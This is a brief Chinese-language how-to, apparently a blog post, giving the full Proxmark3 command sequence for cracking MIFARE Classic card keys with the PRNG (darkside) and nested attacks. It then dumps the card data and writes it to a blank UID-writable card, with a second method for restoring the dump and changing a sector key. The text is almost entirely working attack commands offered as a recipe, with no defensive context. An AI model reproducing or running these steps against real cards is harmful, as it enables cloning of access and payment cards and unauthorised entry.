# 

![](/assets/img/15517861987812.jpg)

```
# 添加 proxmark3 仓库
brew tap proxmark/proxmark3
# 安装稳定版本 proxmark3 客户端
brew install proxmark3


查看当前设备
➜  ~ ls /dev/cu*
/dev/cu.Bluetooth-Incoming-Port /dev/cu.usbmodem14201

#链接设备
➜  ~  proxmark3 /dev/cu.usbmodem14201
#查看卡id
hf 14a reader


1.通过 PRNG 漏洞攻击，无条件获得 0 扇区密匙
hf mf mifare

2.利用 MFOC 漏洞，用已知扇区密匙求所有扇区密匙
hf mf nested 1 0 A ffffffffffff d

3.用破解出的密匙把卡片数据读出导入电脑(dumpdata.bin)
hf mf dump

4.转换 dumpdata.bin 文件到 xxxxx.eml 格式
script run dumptoemul.lua

5.写入到白卡
hf mf cload F075F95D

1.reset uid card
script run formatMifare


方法2

1.将dumpdata.bin写回卡片(密码不会改变)
hf mf restore

2.修改密码
hf mf wrbl 43 B FFFFFFFFFFFF 474249439904ff078000474249439904
```

![-w621](/assets/img//15517881985229.jpg)
